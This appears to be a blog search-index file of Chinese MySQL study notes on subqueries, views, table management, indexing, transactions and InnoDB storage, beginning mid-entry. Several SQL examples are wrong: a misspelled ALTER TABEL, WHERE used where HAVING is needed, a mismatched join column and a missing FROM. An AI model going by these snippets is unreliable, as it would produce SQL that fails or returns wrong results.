&#x27;IT_PROG&#x27;);SELECT department_idFROM employeesGROUP BY department_idWHERE AVG(salary) = (    SELECT MIN(avg_sal)    FROM(        SELECT AVG(salary) avg_sal        FROM employees        GROUP BY department_id    ) t_dept_avg_sal);SELECT department_idFROM employeesGROUP BY department_idWHERE AVG(salary) &lt;= ALL(        SELECT AVG(salary) avg_sal        FROM employees        GROUP BY department_id);\n\n相关子查询\n每执行一次外查询，内查询都要重新执行一次\n\n# 查询员工中工资大于本部门平均工资的员工信息SELECT last_name,salary,department_idFROM employees e1WHERE salary &gt; (    SELECT AVG(salary)    FROM employees e2    WHERE department_id =  e1.department_id);\n\nEXIST和NOT EXIST#查询公司管理者的相关信息SELECT employee_id,last_name,job_id,department_idFROM employeesWHERE employees_id IN(    SELECT DISTINCT manager_id    FROM employees);#查询公司管理者的相关信息SELECT employee_id,last_name,job_id,department_idFROM employees e1WHERE EXISTS(    SELECT *    FROM employees e2    WHERE e1.employee_id = e2.manager_id);\n\n","categories":["MySQL"],"tags":["子查询"]},{"title":"MySQL（八）：视图","url":"/2023/02/09/MySQL%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E8%A7%86%E5%9B%BE/","content":"常见的数据库对象\n视图概述\n有些数据是敏感字段，值给某个级别以上的人员开放，其他人的查询视图中则不提供这个字段\n视图是一个虚拟表，本身不具有数据，占用很少的内存空间\n视图建立在已有表的基础上，视图赖以建立的这些表称为基表。\n视图可以理解为存储起来的SELECT语句\n视图本身的删除，不会导致基表中数据的删除。\n视图中数据的增加、删除和修改，基表中的数据相应的发生变化\n视图的优点：简化查询、控制访问权限\n视图的不足：维护成本高\n\n创建视图# 针对于单表CREATE VIEW vu_emp1AS SELECT employee_id,last_name,salaryFROM emps;CREATE VIEW vu_emp2AS SELECT employee_id emp_id,last_name lname,salaryFROM emps;# 针对于多表CREATE VIEW vu_emp_deptASSELECT e.employee_id,e.department_id,d.department_nameFROM emps e JOIN depts dON e.department_id = d.department_name;# 基于视图创建视图CREATE VIEW vu_emp4ASSELECT employee_id,last_nameFROM vu_emp1;\n\n查看视图# 查看数据库中表对象、视图对象SHOW TABLES;# 查看视图结构DESCRIBE vu_emp1;# 查看视图的属性信息SHOW TABLE STATUS LIKE &#x27;vu_emp1&#x27;;# 查看视图的详细定义信息SHOW CREATE VIEW vu_emp1;\n\n更新视图数据\n更新：增删改\n一般情况下可以更新视图中的数据\n\nUPDATE vu_emp1SET salary = 20000WHERE employee_id = 101;\n\n\n不可更新的视图：\n例如通过聚合函数计算出的视图数据不能修改\n\n\n\n修改、删除视图CREATE OR REPLACE VIEW vu_emp1ASSELECT employee_id,last_name,salaryFROM emps;ALTER VIEW vu_emp1ASSELECT employee_id,last_name,salary,hire_dateFROM emps;DROP VIEW IF EXISTS vu_emp1;\n\n","categories":["MySQL"],"tags":["视图"]},{"title":"MySQL（十一）：触发器","url":"/2023/02/10/MySQL%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9A%E8%A7%A6%E5%8F%91%E5%99%A8/","content":"触发器的创建\n触发器的查看\n触发器的删除\n","categories":["MySQL"],"tags":["触发器"]},{"title":"MySQL（六）：创建和管理表","url":"/2023/02/09/MySQL%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%92%8C%E7%AE%A1%E7%90%86%E8%A1%A8/","content":"创建数据库# 方式1CREATE DATABASE mytest1;# 方式2CREATE DATABASE mytest2 CHARACTER SET &#x27;gbk&#x27;;# 方式3CREATE DATABASE IF NOT EXISTS mytest2 CHARACTER SET &#x27;utf8&#x27;;\n\n管理数据库# 查看当前连接中的数据库有哪些SHOW DATABASES;# 切换数据库USE mytest2;# 查看当前数据库中保存的数据表SHOW TABLES;# 查看当前时使用的数据库SELECT DATABASE() FROM DUAL;# 查看指定数据库下保存的数据表SHOW TABLES FROM mysql;\n\n修改数据库ALTER DATABASE mytest CHARACTER SET &#x27;utf8&#x27;;\n\n删除数据库# 方式1：DROP DATABASE mytest1;# 方式2：推荐。DROP DATABASE IF EXISTS mytest1;\n\n创建表USE atguigudb;SHOW CREATE DATABASE atguigudb;# 方式1CREATE TABLE IF NOT EXISTS myempl(     id INT,    emp_name VARCHAR(15),    hire_date DATE);# 查看表结构DESC myempl;# 方式2：基于现有的表,同时导入数据CREATE TABLE myemp2AS SELECT employee_id,last_name,salaryFROM employees;# 不导入数据CREATE TABLE myemp2AS SELECT employee_id,last_name,salaryFROM employeesWHERE 1=2;\n\nMySQL中的数据类型\n管理表修改表# 添加一个字段ALTER TABEL myemplADD salary DOUBLE(10,2);ALTER TABEL myemplADD salary DOUBLE(10,2) FIRST;ALTER TABEL myemplADD salary DOUBLE(10,2) AFTER emp_name;#修改一个字段：数据类型、长度、默认值（略）ALTER TABLE myemplMODIFY emp_name VARCHAR(25);ALTER TABLE myemplMODIFY emp_name VARCHAR(25) DEFAULT &#x27;aaa&#x27;;# 重命名一个字段ALTER TABLE myemplCHANGE salary monthly_salary DOUBLE(10,2);# 删除一个字段ALTER TABLE myemplDROP COLUMN email;\n\n重命名表RENAME TABLE myemp1TO myemp11;ALTER TABLE myemp1RENAME TO myemp11;\n\n删除表DROP TABLE IF EXISTS myemp1;\n\n清空表TRUNCATE TABLE employees;\n\nDCL中的COMMIT和ROLLBACK\nCOMMIT：提交数据。一旦执行COMMIT，则数据就被永久保存在了数据库中，意味着数据不可以回滚。\nROLLBACK：回滚数据。一旦执行ROLLBACK，则可以实现数据的回滚，回滚到最近的一次COMMIT之后。\n\n对比TRUNCATE TABLE和 DELETE FROM\n相同点：都可以实现对表中所有数据的删除，同时保留表结构。\n不同点：\nTRUNCATE TABLE：一旦执行此操作，表数据全部清除，同时数据时不可以回滚的。\nDELETE FROM：一旦执行此操作，表数据可以全部清除（不带WHERE），同时，数据是可以实现回滚的。\n\n\n面试题：如何选择TRUNCATE TABLE和 DELETE FROM？\nTRUNCATE TABLE 比 DELETE FROM速度块，且使用的系统和事物日志资源少。但TRUNCATE 无事物且不触发TRIGGER，有可以能造成事故，故不建议在开发代码中使用此语句\n\n\n\nDDL和DML的说明\nDDL的操作一旦执行，就不可回滚。不受SET autocommit = FALSE影响\n\nDML的操作默认清空，一旦执行，也是不可回滚的；但是如果在执行DML之前，执行了SET autocommit = FALSE,则执行的DML操作就可以实现回滚\nCOMMIT;SELECT *FROM myemp3;SET autocommit = FALSE;DELETE FROM myemp3;SELECT *FROM myemp3;ROLLBACK;SELECT *FROM myemp3;\n\n数据处理之增删改\n属于DML\n\n插入数据# 方式1：一条一条添加INSERT INTO emplVALUES(1,&#x27;Tom&#x27;,&#x27;2000-12-21&#x27;,3400);INSERT INTO empl(id,hire_date,salary,name) # 推荐VALUES(1,&#x27;2000-12-21&#x27;,3400,&#x27;Tom&#x27;);INSERT INTO empl(id,hire_date,salary,name)VALUES(1,&#x27;2000-12-21&#x27;,3400,&#x27;Tom&#x27;),(2,&#x27;1999-12-02&#x27;,4500,&#x27;Jerry&#x27;);# 方式2：将查询结果插入到表中INSERT INTO empl(id,hire_date,salary,name)SELECT employee_id,hire_date,salary,last_nameFROM employeesWHERE department_id IN (50,60);\n\n更新（修改）数据UPDATE emplSET hire_date = CURDATE()WHERE id = 5;UPDATE emplSET hire_date = CURDATE(),salary = 6000WHERE id = 4;\n\n删除数据DELETE FROM emplWHERE department_id = 50;\n\nMySQL8新特性：计算列CREATE TABLE test1(    a INT,    b INT,    c INT GENERATED ALWAYS AS (a+b)VIRTUAL  #字段c即为计算列)INSERT INTO test1(a,b)VALUES(10,20);UPDATE test1SET a = 100;\n\n","categories":["MySQL"],"tags":["创建和管理表、数据处理"]},{"title":"MySQL（十七）：索引的创建与设计原则","url":"/2023/02/11/MySQL%EF%BC%88%E5%8D%81%E4%B8%83%EF%BC%89%EF%BC%9A%E7%B4%A2%E5%BC%95%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/","content":"索引的分类\n按功能逻辑：普通索引、唯一索引、主键索引、全文索引\n按物理实现方式：聚簇索引、非聚簇索引\n按作用字段个数：单列索引、联合索引\n\n创建索引CREATE TABLE方式\n隐式的方式创建索引：在声明有主键约束、唯一性约束、外键约束的字段上，会自动地添加相关的索引。\n\n显式的方式创建索引：\n\n\n\n# 创建普通索引CREATE TABLE book(    book_id INT,    book_name VARCHAR(100),    authors VARCHAR(100),    info VARCHAR(100),    comment VARCHAR(100),    year_publication YEAR,    # 声明索引    INDEX idx_bname(book_name));# 创建唯一索引# 声明有唯一索引的字段，在添加数据时要保证唯一性CREATE TABLE book1(    book_id INT,    book_name VARCHAR(100),    authors VARCHAR(100),    info VARCHAR(100),    comment VARCHAR(100),    year_publication YEAR,    # 声明索引    UNIQUE INDEX uk_idx_cmt(comment));# 创建主键索引# 通过定义主键约束的方式CREATE TABLE book2(    book_id INT PRIMARY KEY,    book_name VARCHAR(100),    authors VARCHAR(100),    info VARCHAR(100),    comment VARCHAR(100),    year_publication YEAR);# 通过删除主键约束的方式删除主键索引ALTER TABLE book2DROP PRIMARY KEY;# 创建联合索引CREATE TABLE book3(    book_id INT,    book_name VARCHAR(100),    authors VARCHAR(100),    info VARCHAR(100),    comment VARCHAR(100),    year_publication YEAR,    # 声明索引    INDEX idx_bid_bname_info(book_id,book_name,info));\n\nALTER TABLE方式ALTER TABLE book5 ADD INDEX idx_cmt(comment);ALTER TABLE book5 ADD UNIQUE INDEX uk_idx_bname(book_name);\n\nCREATE INDEX的方式CREATE INDEX idx_cmt ON book6(comment);CREATE UNIQUE INDEX uk_idx_bname ON book6(book_name);\n\n删除索引ALTER TABLE book5 DROP INDEX idx_cmt;DROP INDEX uk_idx_bname ON book5; \n\n\n具有 AUTO_INCEMENT约束的索引无法删除\n\n降序索引CREATE TABLE tsl(    a INT,    b INT,    INDEX idx_a_b(a ASC,b DESC));\n\n隐藏索引\n删除前，先隐藏查看性能改变\n\nCREATE TABLE book1(    book_id INT,    book_name VARCHAR(100),    authors VARCHAR(100),    info VARCHAR(100),    comment VARCHAR(100),    year_publication YEAR,    # 创建不可见的索引    INDEX idx_cmt(comment) invisible);\n\n索引的设计原则适合创建索引的情况\n字段的数值有唯一性的限制\n\n频繁作为WHERE查询条件的字段\n\n经常GROUP BY和ORDER BY的列\n\nUPDATE、DELETE的WHERE条件列\n\nDISTINCT字段\n\n多表JOIN连接操作时，创建索引注意事项：\n\n连接表的数量尽量不要超过3张\n对WHERE条件创建索引\n对用于连接的字段创建索引\n\n\n使用列的类型小（该类型数据范围小）的创建索引\n\n使用字符串前缀创建索引\n\n区分度高（散列度高）的列适合作为索引\n一般区分度超过33%，就认为是好的\n\n使用最频繁的列放到联合索引的左侧\n\n在多个字段都要创建索引的情况下，联合索引优于单值索引\n\n\n限制索引的数目建议单张表索引数量不超过6个，原因：\n\n占用磁盘空间\n更新成本大\n优化器选择评估索引成本大\n\n不适合创建索引的情况\n在WHRE中使用不到的字段\n\n数据量小的表\n\n有大量重复数据的列（重复度高于10%）\n\n避免对经常更新的表创建过多的索引\n\n不建议用无序的值作为索引\n例如身份证、UUID、MD5、HASH等\n\n删除不再使用或很少使用的索引\n\n不要定义冗余或重复的索引\n\n\n","categories":["MySQL"],"tags":["索引"]},{"title":"MySQL（十三）：MySQL逻辑架构","url":"/2023/02/10/MySQL%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89%EF%BC%9AMySQL%E9%80%BB%E8%BE%91%E6%9E%B6%E6%9E%84/","content":"逻辑架构剖析\n\n\nConnectors第一层：连接层\n第二层：服务层\nSQL接口\n解析器\n查询优化器\n查询缓存组件\n\n第三层：引擎层插件式存储引擎作用：真正的负责了MySQL中数据的存储和提取，对物理服务器级别维护的底层数据执行操作\n存储层数据真正存储在物理磁盘上\nSQL执行流程\n","categories":["MySQL"],"tags":["MySQL逻辑架构"]},{"title":"MySQL（十二）：用户与权限管理","url":"/2023/02/10/MySQL%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89%EF%BC%9A%E7%94%A8%E6%88%B7%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/","content":"创建用户\n修改用户\n就是对user表进行修改\n\n\n删除用户\n用户密码的设置与管理略\n权限管理与访问控制授予权限\n回收权限\n权限表\n权限表用来控制用户对数据库的访问\n\n\n角色略\n","categories":["MySQL"],"tags":["用户与权限管理"]},{"title":"MySQL（十九）：事务基础知识","url":"/2023/02/12/MySQL%EF%BC%88%E5%8D%81%E4%B9%9D%EF%BC%89%EF%BC%9A%E4%BA%8B%E5%8A%A1%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","content":"数据库事务概述\n事务是数据库区别于文件系统的重要特征之一，有了事务就会让数据库始终保持一致性，同时还能通过事务的机制恢复到某个时间点，这样可以保证已提交到数据库的修改不会因为系统崩溃而丢失。\n在MySQL中，只有InnoDB是支持事务的\n\n基本概念事务：一组逻辑操作单元，使数据从一种状态变换到另一种状态\n事务处理的原则：保证所有事务都作为一个工作单元来执行，即使出现了故障，都不能改变这种执行方式。当在一个事务中执行多个操作时，要么所有事务都被提交（commit），那么这些修改就永久地保存下来；要么数据库管理系统将放弃所作的所有修改，整个事务回滚（rollback)到最初状态。\n事务的ACID特性原子性（atomicity）：原子性是指事务是一个不可分割的工作单位，要么全部提交，要么全部失败回滚。\n一致性（consistency）：一致性是指事物执行前后，数据从一个合法性状态变换到另一个合法性状态。这种状态是语义上的，而不是语义上的，跟具体的业务有关。\n\n合法的数据状态：满足预定的约束的状态就叫做合法的状态。这种状态是由自己来定义的（比如满足现实世界中的约束）。满足这个状态，数据就是一致的，不满足这个状态，数据就是不一致的。\n数据不一致举例：\nA账户有200元，转账300元出去，此时A账户余额-100元。此时数据不一致，因为你定义了一个状态：余额这列必须&gt;&#x3D;0。\nA账户200元，转账50元给B账户，A账户的钱扣了，但B账户因为各种意外，余额并没有增加。此时数据不一致，因为你定义了一个状态：A+B的总余额必须不变。\n在数据表中我们将姓名字段唯一性约束，这时当事务进行提交或者事务发生回滚的适合，如果数据表中姓名不唯一，就破坏了事务的一致性要求。\n\n\n\n隔离性（isolation）：隔离性是指一个事务的执行不能被其它事务干扰，即一个事务内部的操作及使用的数据对并发的其它事务是隔离的，并发执行的各个事务之间不能相互干扰。\n持久性（durability）：持久性是指一个事务一旦被提交，它对数据库中数据的改变是永久性的，接下来的其它操作和数据故障不应该对其有任何影响。\n【即内存—&gt;磁盘】\n持久性是通过事务日志来保证的。\n\n总结\nACID是事务的四大特性，原子性是基础、隔离性是手段、一致性是约束条件、持久性是目的。\n\n事务的状态活动的（active）事务对于的数据库操作正在执行过程中时\n部分提交的（partially committed）当事务的最后一个操作执行完成，但由于操作都在内存中执行，所造成的影响并没有刷新到磁盘中时\n失败的（failed）当事务处在活动的或者部分提交的状态时，可能遇到了某些错误（数据库自身的错误、操作系统错误或者直接断电等）而无法继续执行，或者人为的停止当前事务的执行。就说该事务处在失败的状态。\n中止的（aborted）如果事务执行了一部分而变为失败的状态，那么就需要把已经修改的事务中的操作还原到事务执行前的状态（回滚）。当回滚操作执行完毕时，也就是数据库恢复到了执行事务之前的状态，就说该事务处在了中止的状态。\n提交的（committed）当一个处在部分提交的状态的事务将修改过的数据都同步到磁盘上之后\n\n使用事务显式事务如何开启？使用关键字：START TRANSACTION 或 BEGIN\nSTART TRANSACTION 后面可以跟：READ ONLY &#x2F; READ WRITE(默认) &#x2F; WITH CONSISTENT SNAPSHOT\nBEGIN;INSERT INTO user3 VALUE(&#x27;张三&#x27;);COMMIT;BEGIN;INSERT INTO user3 VALUE(&#x27;李四&#x27;);INSERT INTO user3 VALUE(&#x27;李四&#x27;); # 受主键影响，不能添加成功ROLLBACK;  # 回滚后表中只有张三TRUNCATE TABLE user3; #DDL操作回自动提交数据，不受autocommit变量的影响。\n\n\n\n隐式事务关键字：autocommit\nSHOW VARIABLES LIKE &#39;autocommit&#39;； 默认是ON，此时每一条DML操作都是一个独立的事务。\n关闭自动提交：\n\n方式1：SET autocommit  = FALSE;针对于DML操作有效，对DDL操作无效。\n方式2：在autocommit为true的情况下，使用START TRANSACTION 或 BEGIN开启事务，那么DML操作及不会自动提交数据。\n\n事务的隔离级别数据并发问题脏写（Dirty Write）对于两个事务Session A、Session B，如果事务Session A修改了另一个未提交事务Session B修改过的数据，那就意味着发生了脏写。\n\n脏读（Dirty Read）对于两个事务Session A、Session B，Session A读取了已经被Session B 更新但还没有被提交的字段。之后若Session B 回滚，Session A读取的内容就是临时且无效的。\n\n不可重复读（Non-Repeatable Read)对于两个事务Session A、Session B，Session A读取了一个字段，然后Session B更新了该字段。之后Session A再次读取同一个字段，值就不同了。\n\n幻读（Phantom）对于两个事务Session A、Session B，Session A从一个表中读取了一个字段，然后Session B在该表中插入了一些新的行。之后，如果Session A再次读取同一个表，就会多出几行。\n\nSQL中的四种隔离级别上述问题有轻重缓急之分：脏写 &gt; 脏读 &gt; 不可重复度 &gt; 幻读\n我们愿意舍弃一部分隔离性来换取一部分性能，体现在：设立一些隔离级别，隔离级别越低，并发问题发生的就越多。\nSQL标准中设立了4个隔离级别：\n\nREAD UNCOMMITTED：读未提交\nREAD COMMITTED：读已提交\nREPEATABLE READ：可重复读（MySQL默认级别）\nSERIALIZABLE：可串行化\n\n\n脏写的问题太严重，不论是那种隔离级别，都不允许脏写的情况发生。\n\nMySQL支持的4种隔离级别SHOW VARIABLES LIKE &#39;transaction_isolation&#39;  —-&gt; REPEATABLE READ。 MySQL默认隔离级别为可重复读 \n\n","categories":["MySQL"],"tags":["事务"]},{"title":"MySQL（十五）：索引与数据库调优","url":"/2023/02/10/MySQL%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89%EF%BC%9A%E7%B4%A2%E5%BC%95/","content":"索引的数据结构\n进行数据查找时，首先查看查询条件是否命中某条索引，符合则通过索引查找相关数据，如果不符合则需要全表扫描（即一条一条地查找记录）\n建立索引的目的是为了减少磁盘I&#x2F;O的次数，加快查询速率\n\n\n索引：索引（Index）是帮助MySQL高效获取数据的数据结构\n索引是再存储引擎中实现的，因此每种存储引擎的所以不一定完全相同，并且每一种存储引擎不一定支持所有索引类型。\n优点：\n降低数据库IO成本\n保证数据唯一性\n加速表和表之间的连接\n减少查询中分组和排序的时间\n\n\n缺点：\n创建索引和维护索引要耗费时间\n索引占用磁盘空间\n降低了更新表的速度\n\n\n\nInnoDB中索引的推演设计索引一个简单的索引设计方案\n\n\n\nInnoDB中的索引设计方案迭代1次：目录项记录的页\n迭代2次：多个目录项记录的页\n迭代3次：目录项记录页的目录页\n\nB+ Tree\n常见索引概念索引按照物理实现方式，可以分为2种：聚簇（聚集）和非聚簇（非聚集）索引，也把非聚集索引称为耳机索引或者辅助索引。\n聚簇索引聚簇索引并不是一种单独的索引类型，而是一种数据存储方式（所有的用户记录都存储在了叶子节点），也就是所谓的“索引即数据，数据即索引”。上述例子就是聚簇索引。\n\n特点：\n使用记录主键值的大小进行记录和页的排序：\n页内的记录按照主键的大小顺序排成一个单向链表\n各个存放用户记录的页也是根据用户记录的大小顺序排成一个双向链表\n存放目录项记录的页分为不同的层次，再同一层次中的页也是根据页中目录项记录的主键大小顺序形成一个双向链表\n\n\n\n\n这种聚簇索引并不需要人工再MySQL语句中显式的使用INDEX语句去创建，InnoDB存储索引会自动的创建聚簇索引。\n优点：\n数据访问更快\n对于主键的排序查找和范围查找速度非常快\n节省大量IO操作\n\n\n缺点：\n插入速度严重更依赖于插入顺序。按主键的顺序插入是最快的方式，否则将会出现页分裂，因此一般定义一个自增的ID列为主键\n更新主键代价很高，因此一般定义主键不可更新\n二级索引访问需要两次索引查找：第一次找到主键值，第二次根据主键值找到行数据。\n\n\n限制：\n对于MySQL数据库目前只有InnoDB数据引擎支持聚簇索引，MyISAM并不支持聚簇索引\n每个表只能有一个聚簇索引，一般情况下由主键构建\n如果没有定义主键，InnoDB会选择非空唯一索引代替，如果没有这样的索引，会隐式的定义一个主键\n为了充分利用聚簇索引的聚簇特性，所以innodb表的主键列尽量选用有序的顺序id，而不建议用无序的id，比如UUID、MDS、HASH、字符串列作为主键无法保证数据的顺序增长。\n\n\n\n二级索引（辅助索引、非聚簇索引）\n\n此B+树的叶子节点存储的不是完整的用户记录，而只是c2列+主键这两个列的值\n目录项记录中不再是主键+页号的搭配，而是c2列+页号的搭配\n\n回表：若想根据c2列的值找到完整的记录，仍然需要到聚簇索引中再查一遍，这个过程称为回表。也就是根据c2列的值查询一条完整的记录需要使用到2棵B+树\n\n非聚簇索引的存在不影响数据再聚簇索引中的组织，所以一张表可以有多个非聚簇索引。\n\n聚簇索引和非聚簇索引的区别\n聚簇索引的叶子节点存储的是数据记录，非聚簇索引的叶子节点存储的是数据位置。非聚簇索引不会影响数据表的物理存储顺序。\n一个表只能有一个聚簇索引，因为只能有一种排序存储的方式。但可以有多个非聚簇索引，也就是多个索引目录提供数据检索。\n使用聚簇索引时，数据的查询效率高。但如果对数据进行插入、删除、更新等操作，效率会比非聚簇索引低。\n\n联合索引联合索引实际上属于非聚簇索引。\n\nInnoDB的B+树索引注意事项根页面位置万年不动实际是从上往下生成的，先生成根节点\n内节点（非叶子节点）中目录项记录的唯一性把主键值页添加到二级索引内节点中的目录项记录\n一个页面最少存储2条记录MyISAM中索引方案MyISAM引擎使用B+Tree作为索引结构，叶子节点的data域存放的是数据记录的地址（即MyISAM中没有聚簇索引，全部都是二级索引），MyISAM中数据和索引是分离的。\n\nMyISAM与InnoDB对比\nMyISAM的索引方式都是非聚簇的，InnoDB包含1个聚簇索引。\n\nInnoDB中根据主键值对聚簇索引进行一次查找，在MyISAM中却还需要进行一次回表操作\n\nInnoDB的数据文件本身就是索引文件，而MyISAM索引文件和数据文件是分离的，引文件仅保存数据记录的地址\n\nInnoDB的非聚簇索引的data域存储相应记录主键的值，而MyISAM索引记录的是地址。\n\nMyISAM的回表操作十分快速，因为是拿着地址偏移量直接到文件中取数据，而InnoDB是通过获取主键值之后再去聚簇索引里找记录，虽然也不慢，但还是比不上直接用地址去访问。\n\nInnoDB要求表必须有主键，MyISAM可以没有。\n\n\n索引的代价空间上的代价每建立一个索引都要为它建立一颗B+树，每一颗B+树的每一个节点都是一个数据页，一个页默认会占用16KB的存储空间，一颗很大的B+树由许多数据页组成，那就是很大一片存储空间。\n时间上的代价每次对表中数据进行增、删、改下操作时，都需要去修改各个B+树索引，需要额外时间进行记录移位、页面分裂、页面回收等操作来维护好节点和记录的排序。\nMySQL数据结构的合理性\nHash结构效率高，那为什么索引结构要设计成树型呢？\n\n原因1：Hash索引仅能满足（&#x3D;）（&lt;&gt;）和IN等值查询，如果进行范围查询，Hash索引时间复杂度会退化为O(n)；而树形的有序特性，依然能保持O(log2N)的高效率\n原因2：Hash索引数据的存储没有顺序，在ORDER BY情况下，还需要对数据重新排列。\n原因3：对于联合索引的情况，Hash值是将联合索引键合并后一起计算的，无法区分（4，’a’) 和 （3，’b’）的情况\n原因4：对于等值查询来说，通常Hash索引的效率更高，不过页存在一种情况，就是索引列的重复值如果很多，效率就会降低，因为遇到Hash冲突时，需要遍历桶中的行指针来比较。所以Hash所以通常不会用到重复值多的列上，比如性别、年龄的情况。\n\n\nB-Tree 和 B+Tree的区别\n\nB-Tree中，关键字集合分布在整棵树中，即叶子节点和非叶子节点都存放数据。搜索有可能在非叶子节点结束。\nB+Tree非叶子节点的关键字也会同时存在子节点中，非叶子节点仅用于索引，不保存数据记录，跟记录有关的信息都在叶子节点中。\nB+Tree的查询效率更高，同样的磁盘页大小，B+树比B树更矮胖。\n在范围查找上，B+树效率比B树高\n\n\n\n","categories":["MySQL"],"tags":["索引","数据库优化"]},{"title":"MySQL（十六）：InnoDB数据存储结构","url":"/2023/02/10/MySQL%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89%EF%BC%9AInnoDB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/","content":"数据的存储结构：页磁盘与内存交互基本单位：页InnoDB中页的大小默认为16KB\n一个页中可以存储多个行记录\n页结构概述页与页直接通过双向链表相关联，每个数据页中的记录会按照主键值从小到大的顺序组成一个单向链表。\n因为数据页记录是以单向链表的形式存储，单向链表特点是插入、删除方便，但查找效率不高（最差情况下要遍历链表上所有节点才能完成）。因此每个数据页都会为存储在它里面的记录生成一个页目录（数组结构），通过二分查找快速定位到对应的槽，然后再遍历该槽对应分组中的记录即可快速找到指定记录。\n页的上层结构\n页的内部结构\n\n面试题：B+树是如何进行记录检索的？\n如果通过B+树的索引查询行记录，首先是通过B+树的根开始，逐层检索，直到找到叶子节点，也就是找到对应的数据页为止，将数据页加载到内存中，页目录中的槽（slot）采用二分查找的方式先找到一个粗略的记录分组，然后再在分组中通过链表遍历的方式查找记录。\n\n\nInnoDB的行格式（或记录格式）COMPACT行格式\nDynamic和Compressed行格式Redundant行格式\n有所冗余（可忽略）\n区、段与碎片区\n为什么要有区？\n两个页之间的物理位置可能离得非常远 —-&gt; 随机I&#x2F;O（时间浪费在寻道和半圈旋转上）\n尽量让链表中相邻页的物理位置也相邻  —-&gt; 顺序I&#x2F;O\n引入区：一个区会分配64个连续的页。\n\n为什么要有段？\n为了区分叶子节点（数据页）和非叶子节点（目录页）。\n一个索引会生成2个段：\n\n叶子节点段（数据段）：存放叶子节点的区的集合。\n非叶子节点段（索引段）：存放非叶子节点的区的集合。\n\n段其实不对应表空间中某个连续的物理区域，而是一个逻辑上的概念，由若干个零散的页面以及一些完整的区组成。\n\n为什么要有碎片区？\n为了考虑以完整的区为单位分配给某个段对于数据量较小的表太浪费存储空间的这种情况，InnoDB提出了一个碎片（fragment）区的概念。在一个碎片区中，并不是所有的页都是为了存储同一个段的数据而存在的，而是碎片区中的页可以用于不同的目的。碎片区直属于表空间，并不属于任何一个段。\n\n\n表空间 表空间是一个逻辑容器，从管理上可以划分为：系统表空间、独立表空间、撤销表空间、临时表空间\n独立表空间每张表有一个独立的表空间，可以在不同的数据库之间迁移\n系统表空间整个MySQL进程只有一个系统表空间\n","categories":["MySQL"],"tags":["InnoDB","数据存储结构"]},{"title":"MySQL（十八）：索引优化与查询优化","url":"/2023/02/11/MySQL%EF%BC%88%E5%8D%81%E5%85%AB%EF%BC%89%EF%BC%9A%E7%B4%A2%E5%BC%95%E4%BC%98%E5%8C%96%E4%B8%8E%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96/","content":"\n哪些维度可以进行数据库调优？\n\n索引失效、没有充分利用到索引 —— 索引建立\n关联查询太多JOIN（设计缺陷或不得已的需求）——SQL优化\n服务器调优及各个参数设置（缓冲、线程数等）——调整my.cnf\n数据过多——分库分表\n\n\n其实用不用索引，最终都是优化器说得算。基于cost开销，它不是基于规则，也不是基于语义。\n关联查询优化情况1：左外连接# 未添加索引EXPLAIN SELECT SQL_NO_CACHE * FROM type LEFT JOIN book ON type.card = book.card;# 添加索引CREATE INDEX Y ON book(card);EXPLAIN SELECT SQL_NO_CACHE * FROM type LEFT JOIN book ON type.card = book.card;CREATE INDEX X ON type(card);EXPLAIN SELECT SQL_NO_CACHE * FROM type LEFT JOIN book ON type.card = book.card;\n\n情况2：内连接# 未添加索引EXPLAIN SELECT SQL_NO_CACHE * FROM type INNER JOIN book ON type.card = book.card;# 添加索引CREATE INDEX Y ON book(card);EXPLAIN SELECT SQL_NO_CACHE * FROM type INNER JOIN book ON type.card = book.card;CREATE INDEX X ON type(card);EXPLAIN SELECT SQL_NO_CACHE * FROM type INNER JOIN book ON type.card = book.card;# 结论：对于内连接来说，查询优化器可以决定谁作为驱动表，谁作为被驱动表出现\n\n子查询优化在MySQL中，可以使用连接（JOIN）查询来替代子查询\n排序（ORDER BY）优化在ORDER BY字段上使用索引，避免使用FileSort排序\nGROUP BY优化GROUP BY使用索引的原则集合和ORDER BY一致，即使没有过滤条件用到索引，也可以直接使用索引\nGROUP BY先排序再分组，遵照索引键的最佳左前缀法则\n分页（Limit）查询优化EXPLAIN SELECT * FROM student LIMIT 200000,10;\n\n优化思路一在索引上完成排序分页操作，最后根据主键关联回原表查询所需要的其它列内容。\nEXPLAIN SELECT * student t,(SELECT id FROM student ORDER BY id LIMIT 200000,10) aWHERE t.id = a.id;\n\n优化思路二该方案适用于主键自增的表，可以把Limit查询换成某个位置的查询\nEXPLAIN SELECT * FROM student WHERE id &gt; 200000 LIMIT 10;\n\n优先考虑覆盖索引\n覆盖索引：一个索引包含了满足查询结果的字段就叫做覆盖索引（即 索引列 + 主键 包含 SELECT 到 FROM之间查询的列，不需要回表操作）\n优点：\n避免InnoDB表进行索引的二次查询（回表）\n可以把随机IO（回表时）变成顺序IO（不回表）加快查询效率\n\n\n缺点：\n索引字段的维护需要代价\n\n\n\n索引条件下推\n索引条件下推（ICP）：是一种在存储引擎层使用索引过滤数据的优化方式。\n优点：\n降低回表次数，从而减少随机I&#x2F;O操作\n\n\n\n","categories":["MySQL"],"tags":["索引","数据库调优"]},{"title":"MySQL（十四）：存储引擎","url":"/2023/02/10/MySQL%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89%EF%BC%9A%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/","content":"\n简而言之，存储引擎就是指表的类型。它的功能就是接收上层传下来的指令（执行计划），然后对表中的数据进行提取或写入操作。\n存储引擎决定了每个表在底层目录的存储结构。\n\n查看存储引擎show 